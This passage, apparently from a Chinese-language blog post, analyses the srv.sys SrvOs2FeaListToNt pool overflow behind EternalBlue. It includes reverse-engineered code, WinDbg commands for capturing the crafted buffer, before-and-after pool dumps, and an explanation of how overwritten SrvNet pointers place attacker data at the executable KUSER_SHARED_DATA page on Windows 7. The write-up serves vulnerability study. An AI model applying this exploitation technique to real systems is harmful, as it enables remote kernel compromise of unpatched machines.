                    return 0;
                }
                v11 = 0xC0000001;
                //*a4 = v5 - pOs2Fea;
            } else{
                while (!(*(BYTE *)pOs2FeaBody & 0x7F))
                {
                    v12 = pNtFea;
                    v5 = pOs2FeaBody;
                    pNtFea = SrvOs2FeaToNt(pNtFea, pOs2FeaBody);
                    pOs2FeaBody += *(BYTE *)(pOs2FeaBody + 1) + *(WORD *)(pOs2FeaBody + 2) + 5;
                    if (pOs2FeaBody > v14)
                    {
                        v10 = v12;
                        goto LABEL_13;
                    }
                }
                //*a4 = pOs2FeaBody - pOs2Fea;
                v11 = 0xC000000D;
            }
            return v11;
        }
        return 0;
    }
看到我加了个__debugbreak的地方，断在那里就说明溢出了
1.bin的内容最后我会给大家带上。
大家也可以自己抓1.bin的内容，方法如下：
    kd> u SrvOs2FeaListToNt
    srv!SrvOs2FeaListToNt:
    9877b565 8bff            mov     edi,edi
    9877b567 55              push    ebp
    9877b568 8bec            mov     ebp,esp
    9877b56a 51              push    ecx
    9877b56b 8365fc00        and     dword ptr [ebp-4],0
    9877b56f 56              push    esi
    9877b570 57              push    edi
    9877b571 8b7d08          mov     edi,dword ptr [ebp+8]
    9877b574 57              push    edi
    9877b575 e82effffff      call    srv!SrvOs2FeaListSizeToNt (9877b4a8)
    kd> ba e1 9877b575
    kd> g
    Breakpoint 0 hit
    srv!SrvOs2FeaListToNt+0x10:
    9877b575 e82effffff      call    srv!SrvOs2FeaListSizeToNt (9877b4a8)
    kd> !pool edi
    Pool page a3fd10d8 region is Paged pool
    *a3fd1000 : large page allocation, tag is LStr, size is 0x11000 bytes
            Pooltag LStr : SMB1 transaction, Binary : srv.sys
    kd> .writemem 1.bin a3fd10d8 l0x11000-d8
**漏洞利用**
我们先来看pool数据覆盖的情况。
覆盖前
    8d1aa000 00 10 01 00 00 00 00 00 58 00 00 00 70  ........X...p
    8d1aa00d 09 11 95 08 00 00 00 08 2f 1f 9f 08 2f  ......../.../
    8d1aa01a 1f 9f 60 a1 1a 8d a0 0e 01 00 80 00 00  ..`..........
    8d1aa027 00 3c a0 1a 8d 00 00 00 00 f7 ff 00 00  .............
    8d1aa034 10 a0 1a 8d a4 a0 1a 8d 00 00 00 00 60  ............`
    8d1aa041 00 04 10 00 00 00 00 60 a1 1a 8d 00 a0  .......`.....
    8d1aa04e 1a 8d a0 0e 01 00 60 01 00 00 d5 8e 01  ......`......
    8d1aa05b 00 d4 8e 01 00 13 8d 01 00 92 6f 00 00  ..........o..
    8d1aa068 11 36 01 00 10 6a 00 00 4f 9a 03 00 8e  .6...j..O....
    8d1aa075 4d 01 00 4d d6 00 00 0c 6f 00 00 4b 71  M..M....o..Kq
    8d1aa082 00 00 8a 99 03 00 c9 6d 00 00 c8 70 00  .......m...p.
    8d1aa08f 00 c7 69 00 00 86 35 01 00 05 94 03 00  ..i...5......
    8d1aa09c 70 09 11 95 28 00 00 00 00 00 00 00 64  p...(.......d
    8d1aa0a9 00 00 00 70 09 11 95 38 00 00 00 00 00  ...p...8.....
    8d1aa0b6 00 00 a0 0e 01 00 ff 0f 00 00 28 a5 00  ..........(..
    8d1aa0c3 00 70 09 11 95 30 a5 00 00 70 09 11 95  .p...0...p...
    8d1aa0d0 38 a5 00 00 70 09 11 95 40 a5 00 00 70  8...p...@...p
    8d1aa0dd 09 11 95 48 a5 00 00 70 09 11 95 50 a5  ...H...p...P.
    8d1aa0ea 00 00 70 09 11 95 58 a5 00 00 70 09 11  ..p...X...p..
    8d1aa0f7 95 f0 04 00 00 70 09 11 95 f8 04 00 00  .....p.......
    8d1aa104 70 09 11 95 00 05 00 00 70 09 11 95 4e  p.......p...N
    8d1aa111 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa11e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa12b 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa138 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa145 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa152 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa15f 4e fe 53 4d 42 00 00 00 00 00 00 00 00  N.SMB........
覆盖后
    8d1aa000 00 00 00 00 00 00 00 00 ff ff 00 00 00  .............
    8d1aa00d 00 00 00 ff ff 00 00 00 00 00 00 00 00  .............
    8d1aa01a 00 00 00 00 00 00 00 00 00 00 00 00 00  .............
    8d1aa027 00 00 f1 df ff 00 00 00 00 00 00 00 00  .............
    8d1aa034 20 f0 df ff 00 f1 df ff ff ff ff ff 60   ...........`
    8d1aa041 00 04 10 00 00 00 00 80 ef df ff 00 00  .............
    8d1aa04e 00 00 10 00 d0 ff ff ff ff ff 18 01 d0  .............
    8d1aa05b ff ff ff ff ff 00 00 00 00 00 00 00 00  .............
    8d1aa068 00 00 00 00 00 00 00 00 60 00 04 10 00  ........`....
    8d1aa075 00 00 00 00 00 00 00 00 00 00 00 90 ff  .............
    8d1aa082 cf ff ff ff ff ff 00 00 00 00 00 00 00  .............
    8d1aa08f 00 80 10 00 00 00 00 00 00 00 00 00 00  .............
    8d1aa09c 00 00 00 00 4b 00 00 00 00 00 00 00 64  ....K.......d
    8d1aa0a9 00 00 00 70 09 11 95 38 00 00 00 00 00  ...p...8.....
    8d1aa0b6 00 00 a0 0e 01 00 ff 0f 00 00 28 a5 00  ..........(..
    8d1aa0c3 00 70 09 11 95 30 a5 00 00 70 09 11 95  .p...0...p...
    8d1aa0d0 38 a5 00 00 70 09 11 95 40 a5 00 00 70  8...p...@...p
    8d1aa0dd 09 11 95 48 a5 00 00 70 09 11 95 50 a5  ...H...p...P.
    8d1aa0ea 00 00 70 09 11 95 58 a5 00 00 70 09 11  ..p...X...p..
    8d1aa0f7 95 f0 04 00 00 70 09 11 95 f8 04 00 00  .....p.......
    8d1aa104 70 09 11 95 00 05 00 00 70 09 11 95 4e  p.......p...N
    8d1aa111 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa11e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa12b 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa138 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa145 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa152 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e 4e  NNNNNNNNNNNNN
    8d1aa15f 4e fe 53 4d 42 00 00 00 00 00 00 00 00  N.SMB........
在将下面SrvNet分配的对象覆盖前面的a1字节后。由于被覆盖的pool里面存在用于接收数据的buffer的指针。像上面描述的0x8d1aa034(0xffd0f020)这个地方的指针（我发懒了没有去确定到底是哪一个）。srvnet在接收包的时候就会在固定0xffdff000这个地址存入客户端发送来的数据。
0xffdff0000这个地址是什么？wrk中有定义，如下：
    // addressed from 0xffdf0000 - 0xffdfffff are reserved for the system
    // begin_ntddk begin_ntosp
    #define KI_USER_SHARED_DATA         0xffdf0000
    #define SharedUserData  ((KUSER_SHARED_DATA * const) KI_USER_SHARED_DATA)
这块内存是系统预留的，里面保存了系统的一些信息，像时钟，版本，配置之类。注意这个地址在win10下是不可以执行的。所以这个利用方法在win10下是不可用的。
win7
    kd> !pte ffdff000
                        VA ffdff000
    PDE at C0603FF0            PTE at C07FEFF8
    contains 000000000018A063  contains 00000000001E3163
    pfn 18a       ---DA--KWEV  pfn 1e3       -G-DA--KWEV  //E表示可执行
覆盖完之后是这样。
    kd&gt; db ffdff000 l1000
    ffdff000  00 00 00 00 00 00 00 00-03 00 00 00 00 00 00 00  ................
    ffdff010  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff020  00 00 00 00 00 00 00 00-03 00 00 00 00 00 00 00  ................
    ffdff030  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff080  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff090  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff0a0  b0 00 d0 ff ff ff ff ff-b0 00 d0 ff ff ff ff ff  ................
    ffdff0b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff0c0  c0 f0 df ff c0 f0 df ff-00 00 00 00 00 00 00 00  ................
    ffdff0d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff0e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff0f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff100  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffdff110  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................